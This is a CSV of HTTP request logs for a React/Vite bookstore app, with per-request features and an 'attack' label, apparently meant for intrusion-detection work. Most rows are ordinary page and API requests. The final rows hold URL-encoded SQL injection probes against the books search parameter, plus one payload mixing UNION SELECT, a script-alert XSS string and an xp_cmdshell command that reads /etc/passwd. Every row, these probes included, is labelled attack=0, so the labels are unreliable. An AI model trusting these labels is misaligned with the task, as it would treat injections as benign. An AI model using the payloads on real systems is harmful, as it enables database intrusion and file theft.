ip,method,endpoint,status,endpoint_length,param_count,has_query,attack
175.45.191.19,GET,/src/pages/index.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/carts/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/verify-otp/index.tsx,304,31,0,0,0
175.45.191.19,GET,/src/pages/books/bookPlaceholder.tsx,304,36,0,0,0
175.45.191.19,GET,/src/pages/checkouts/index.tsx,304,30,0,0,0
175.45.191.19,GET,/src/components/ui/card.tsx,304,27,0,0,0
175.45.191.19,GET,/src/components/ui/input.tsx,304,28,0,0,0
175.45.191.19,GET,/src/components/ui/button.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/select.tsx,304,29,0,0,0
175.45.191.19,GET,/src/navbar.tsx,304,15,0,0,0
175.45.191.19,GET,/src/props/requiredRole.tsx,304,27,0,0,0
175.45.191.19,GET,/src/props/truncater.tsx,304,24,0,0,0
175.45.191.19,GET,/src/hooks/useAuthFetch.ts,304,26,0,0,0
175.45.191.19,GET,/src/components/ui/textarea.tsx,304,31,0,0,0
175.45.191.19,GET,/src/components/ui/dialog.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/input-otp.tsx,304,32,0,0,0
175.45.191.19,GET,/src/lib/utils.ts,304,17,0,0,0
175.45.191.19,GET,/src/components/ui/navigation-menu.tsx,304,38,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/?token=Kp5rLtCf5Hrs,200,20,0,1,0
175.45.191.19,GET,/books,200,6,0,0,0
175.45.191.19,GET,/@vite/client,304,13,0,0,0
175.45.191.19,GET,/src/main.tsx,304,13,0,0,0
175.45.191.19,GET,/@react-refresh,304,15,0,0,0
175.45.191.19,GET,/src/App.tsx,304,12,0,0,0
175.45.191.19,GET,/node_modules/vite/dist/client/env.mjs,304,38,0,0,0
175.45.191.19,GET,/src/pages/admin/books/create/index.tsx,304,39,0,0,0
175.45.191.19,GET,/src/pages/book/$id.tsx,304,23,0,0,0
175.45.191.19,GET,/src/pages/admin/books/edit/$id.tsx,304,35,0,0,0
175.45.191.19,GET,/src/pages/admin/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/book/comments.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/login/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/profile/$id.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/error.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/register/index.tsx,304,29,0,0,0
175.45.191.19,GET,/src/pages/books/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/admin/books/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/admin/users/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/books/bookPlaceholder.tsx,304,36,0,0,0
175.45.191.19,GET,/src/pages/index.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/verify-otp/index.tsx,304,31,0,0,0
175.45.191.19,GET,/src/pages/carts/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/checkouts/index.tsx,304,30,0,0,0
175.45.191.19,GET,/src/pages/profile/index.tsx,304,28,0,0,0
175.45.191.19,GET,/src/hooks/useAuthFetch.ts,304,26,0,0,0
175.45.191.19,GET,/src/components/ui/input.tsx,304,28,0,0,0
175.45.191.19,GET,/src/components/ui/card.tsx,304,27,0,0,0
175.45.191.19,GET,/src/components/ui/button.tsx,304,29,0,0,0
175.45.191.19,GET,/src/props/requiredRole.tsx,304,27,0,0,0
175.45.191.19,GET,/src/navbar.tsx,304,15,0,0,0
175.45.191.19,GET,/src/components/ui/textarea.tsx,304,31,0,0,0
175.45.191.19,GET,/src/components/ui/input-otp.tsx,304,32,0,0,0
175.45.191.19,GET,/src/components/ui/select.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/dialog.tsx,304,29,0,0,0
175.45.191.19,GET,/src/props/truncater.tsx,304,24,0,0,0
175.45.191.19,GET,/src/lib/utils.ts,304,17,0,0,0
175.45.191.19,GET,/src/components/ui/navigation-menu.tsx,304,38,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/?token=Kp5rLtCf5Hrs,200,20,0,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/books,200,6,0,0,0
175.45.191.19,GET,/src/main.tsx,304,13,0,0,0
175.45.191.19,GET,/@vite/client,304,13,0,0,0
175.45.191.19,GET,/@react-refresh,304,15,0,0,0
175.45.191.19,GET,/node_modules/vite/dist/client/env.mjs,304,38,0,0,0
175.45.191.19,GET,/src/App.tsx,304,12,0,0,0
175.45.191.19,GET,/src/pages/admin/books/create/index.tsx,304,39,0,0,0
175.45.191.19,GET,/src/pages/admin/users/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/index.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/error.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/login/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/admin/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/admin/books/edit/$id.tsx,304,35,0,0,0
175.45.191.19,GET,/src/pages/profile/index.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/books/bookPlaceholder.tsx,304,36,0,0,0
175.45.191.19,GET,/src/pages/book/comments.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/register/index.tsx,304,29,0,0,0
175.45.191.19,GET,/src/pages/verify-otp/index.tsx,304,31,0,0,0
175.45.191.19,GET,/src/pages/admin/books/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/profile/$id.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/books/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/checkouts/index.tsx,304,30,0,0,0
175.45.191.19,GET,/src/pages/book/$id.tsx,304,23,0,0,0
175.45.191.19,GET,/src/pages/carts/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/props/requiredRole.tsx,304,27,0,0,0
175.45.191.19,GET,/src/props/truncater.tsx,304,24,0,0,0
175.45.191.19,GET,/src/components/ui/dialog.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/input.tsx,304,28,0,0,0
175.45.191.19,GET,/src/hooks/useAuthFetch.ts,304,26,0,0,0
175.45.191.19,GET,/src/components/ui/card.tsx,304,27,0,0,0
175.45.191.19,GET,/src/navbar.tsx,304,15,0,0,0
175.45.191.19,GET,/src/components/ui/input-otp.tsx,304,32,0,0,0
175.45.191.19,GET,/src/components/ui/button.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/select.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/textarea.tsx,304,31,0,0,0
175.45.191.19,GET,/src/lib/utils.ts,304,17,0,0,0
175.45.191.19,GET,/src/components/ui/navigation-menu.tsx,304,38,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/?token=Kp5rLtCf5Hrs,200,20,0,1,0
175.45.191.19,POST,/api/v1/auths/refresh,200,21,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/books,200,6,0,0,0
175.45.191.19,GET,/@vite/client,304,13,0,0,0
175.45.191.19,GET,/@react-refresh,304,15,0,0,0
175.45.191.19,GET,/src/main.tsx,304,13,0,0,0
175.45.191.19,GET,/src/App.tsx,304,12,0,0,0
175.45.191.19,GET,/node_modules/vite/dist/client/env.mjs,304,38,0,0,0
175.45.191.19,GET,/src/pages/admin/books/edit/$id.tsx,304,35,0,0,0
175.45.191.19,GET,/src/pages/admin/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/admin/books/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/book/comments.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/book/$id.tsx,304,23,0,0,0
175.45.191.19,GET,/src/pages/admin/users/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/books/bookPlaceholder.tsx,304,36,0,0,0
175.45.191.19,GET,/src/pages/carts/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/profile/$id.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/books/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/login/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/profile/index.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/verify-otp/index.tsx,304,31,0,0,0
175.45.191.19,GET,/src/pages/checkouts/index.tsx,304,30,0,0,0
175.45.191.19,GET,/src/pages/error.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/register/index.tsx,304,29,0,0,0
175.45.191.19,GET,/src/pages/index.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/admin/books/create/index.tsx,304,39,0,0,0
175.45.191.19,GET,/src/components/ui/input.tsx,304,28,0,0,0
175.45.191.19,GET,/src/hooks/useAuthFetch.ts,304,26,0,0,0
175.45.191.19,GET,/src/components/ui/select.tsx,304,29,0,0,0
175.45.191.19,GET,/src/props/requiredRole.tsx,304,27,0,0,0
175.45.191.19,GET,/src/components/ui/button.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/card.tsx,304,27,0,0,0
175.45.191.19,GET,/src/props/truncater.tsx,304,24,0,0,0
175.45.191.19,GET,/src/navbar.tsx,304,15,0,0,0
175.45.191.19,GET,/src/components/ui/textarea.tsx,304,31,0,0,0
175.45.191.19,GET,/src/components/ui/dialog.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/input-otp.tsx,304,32,0,0,0
175.45.191.19,GET,/src/lib/utils.ts,304,17,0,0,0
175.45.191.19,GET,/src/components/ui/navigation-menu.tsx,304,38,0,0,0
175.45.191.19,GET,/?token=Kp5rLtCf5Hrs,200,20,0,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,POST,/api/v1/auths/refresh,200,21,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.188.252,GET,/api/v1/books,200,13,0,0,0
175.45.188.252,GET,/api/v1/books,200,13,0,0,0
175.45.191.19,GET,/books,200,6,0,0,0
175.45.191.19,GET,/@vite/client,304,13,0,0,0
175.45.191.19,GET,/src/main.tsx,304,13,0,0,0
175.45.191.19,GET,/@react-refresh,304,15,0,0,0
175.45.191.19,GET,/src/App.tsx,304,12,0,0,0
175.45.191.19,GET,/node_modules/vite/dist/client/env.mjs,304,38,0,0,0
175.45.191.19,GET,/src/pages/admin/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/book/comments.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/profile/index.tsx,304,28,0,0,0
175.45.191.19,GET,/src/pages/carts/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/admin/books/edit/$id.tsx,304,35,0,0,0
175.45.191.19,GET,/src/pages/checkouts/index.tsx,304,30,0,0,0
175.45.191.19,GET,/src/pages/verify-otp/index.tsx,304,31,0,0,0
175.45.191.19,GET,/src/pages/books/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/book/$id.tsx,304,23,0,0,0
175.45.191.19,GET,/src/pages/error.tsx,304,20,0,0,0
175.45.191.19,GET,/src/pages/admin/books/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/profile/$id.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/login/index.tsx,304,26,0,0,0
175.45.191.19,GET,/src/pages/books/bookPlaceholder.tsx,304,36,0,0,0
175.45.191.19,GET,/src/pages/register/index.tsx,304,29,0,0,0
175.45.191.19,GET,/src/pages/admin/users/index.tsx,304,32,0,0,0
175.45.191.19,GET,/src/pages/admin/books/create/index.tsx,304,39,0,0,0
175.45.191.19,GET,/src/pages/index.tsx,304,20,0,0,0
175.45.191.19,GET,/src/components/ui/button.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/textarea.tsx,304,31,0,0,0
175.45.191.19,GET,/src/components/ui/select.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/card.tsx,304,27,0,0,0
175.45.191.19,GET,/src/props/requiredRole.tsx,304,27,0,0,0
175.45.191.19,GET,/src/navbar.tsx,304,15,0,0,0
175.45.191.19,GET,/src/hooks/useAuthFetch.ts,304,26,0,0,0
175.45.191.19,GET,/src/components/ui/dialog.tsx,304,29,0,0,0
175.45.191.19,GET,/src/components/ui/input.tsx,304,28,0,0,0
175.45.191.19,GET,/src/components/ui/input-otp.tsx,304,32,0,0,0
175.45.191.19,GET,/src/props/truncater.tsx,304,24,0,0,0
175.45.191.19,GET,/src/lib/utils.ts,304,17,0,0,0
175.45.191.19,GET,/src/components/ui/navigation-menu.tsx,304,38,0,0,0
175.45.191.19,GET,/?token=Kp5rLtCf5Hrs,200,20,0,1,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,401,35,2,1,0
175.45.191.19,POST,/api/v1/auths/refresh,200,21,0,0,0
175.45.191.19,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1&size=9&WpsH=4170%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,200,299,3,1,0
175.45.188.252,GET,/api/v1/books?search=&page=1&size=9,200,35,2,1,0
175.45.188.252,GET,/api/v1/books?search=9221&page=1&size=9,200,39,2,1,0
175.45.188.252,GET,/api/v1/books?search=%2C%29%28%28%27%22%28.%29%2C&page=1&size=9,200,63,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27KViiax%3C%27%22%3ErQqJMe&page=1&size=9,200,62,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%205006%3D9102%20AND%20%287678%3D7678&page=1&size=9,200,81,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%203250%3D3250%20AND%20%286657%3D6657&page=1&size=9,200,81,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%208384%3D8389&page=1&size=9,200,55,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%203250%3D3250&page=1&size=9,200,55,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%206968%3D6623%20AND%20%28%27zcEW%27%3D%27zcEW&page=1&size=9,200,93,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%203250%3D3250%20AND%20%28%27XGrX%27%3D%27XGrX&page=1&size=9,200,93,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%207899%3D5756%20AND%20%27keGV%27%3D%27keGV&page=1&size=9,200,87,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%203250%3D3250%20AND%20%27iuFV%27%3D%27iuFV&page=1&size=9,200,87,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%204510%3D9003--%20tiMr&page=1&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%203250%3D3250--%20nPHz&page=1&size=9,200,64,2,1,0
175.45.188.252,GET,/api/v1/books?search=%28SELECT%20%28CASE%20WHEN%20%287594%3D6636%29%20THEN%20%27%27%20ELSE%20%28SELECT%206636%20UNION%20SELECT%206128%29%20END%29%29&page=1&size=9,200,162,2,1,0
175.45.188.252,GET,/api/v1/books?search=%28SELECT%20%28CASE%20WHEN%20%281425%3D1425%29%20THEN%20%27%27%20ELSE%20%28SELECT%201521%20UNION%20SELECT%203941%29%20END%29%29&page=1&size=9,200,162,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%20EXTRACTVALUE%289851%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%289851%3D9851%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%282307%3D2307&page=1&size=9,200,189,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%20EXTRACTVALUE%289851%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%289851%3D9851%2C1%29%29%29%2C0x716a627071%29%29&page=1&size=9,200,163,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%20EXTRACTVALUE%289851%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%289851%3D9851%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%28%27ySqk%27%3D%27ySqk&page=1&size=9,200,201,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%20EXTRACTVALUE%289851%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%289851%3D9851%2C1%29%29%29%2C0x716a627071%29%29%20AND%20%27nvER%27%3D%27nvER&page=1&size=9,200,195,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%20EXTRACTVALUE%289851%2CCONCAT%280x5c%2C0x717a6b6271%2C%28SELECT%20%28ELT%289851%3D9851%2C1%29%29%29%2C0x716a627071%29%29--%20nwIV&page=1&size=9,200,172,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%208562%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288562%3D8562%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%282121%3D2121&page=1&size=9,200,382,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%208562%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288562%3D8562%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29&page=1&size=9,200,356,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%208562%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288562%3D8562%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%28%27DiXR%27%3D%27DiXR&page=1&size=9,200,394,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%208562%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288562%3D8562%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27xrVF%27%3D%27xrVF&page=1&size=9,200,388,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%208562%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%288562%3D8562%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29--%20fVjx&page=1&size=9,200,365,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%203860%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283860%3D3860%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%286669%3D6669&page=1&size=9,200,363,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%203860%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283860%3D3860%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29&page=1&size=9,200,337,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%203860%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283860%3D3860%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%28%27SwIj%27%3D%27SwIj&page=1&size=9,200,375,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%203860%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283860%3D3860%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29%20AND%20%27sjyZ%27%3D%27sjyZ&page=1&size=9,200,369,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%203860%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28107%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%283860%3D3860%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28106%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28113%29%29%29--%20sogh&page=1&size=9,200,346,2,1,0
175.45.188.252,GET,/api/v1/books?search=%29%20AND%206762%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286762%3D6762%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%285104%3D5104&page=1&size=9,200,453,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%206762%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286762%3D6762%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29&page=1&size=9,200,427,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%29%20AND%206762%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286762%3D6762%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27NLbz%27%3D%27NLbz&page=1&size=9,200,465,2,1,0
175.45.188.252,GET,/api/v1/books?search=%27%20AND%206762%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286762%3D6762%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27lupA%27%3D%27lupA&page=1&size=9,200,459,2,1,0
175.45.188.252,GET,/api/v1/books?search=%20AND%206762%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286762%3D6762%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20Uxxs&page=1&size=9,200,436,2,1,0
175.45.188.252,GET,/api/v1/books?search=%28SELECT%20CONCAT%28CONCAT%28%27qzkbq%27%2C%28CASE%20WHEN%20%289049%3D9049%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qjbpq%27%29%29&page=1&size=9,200,179,2,1,0
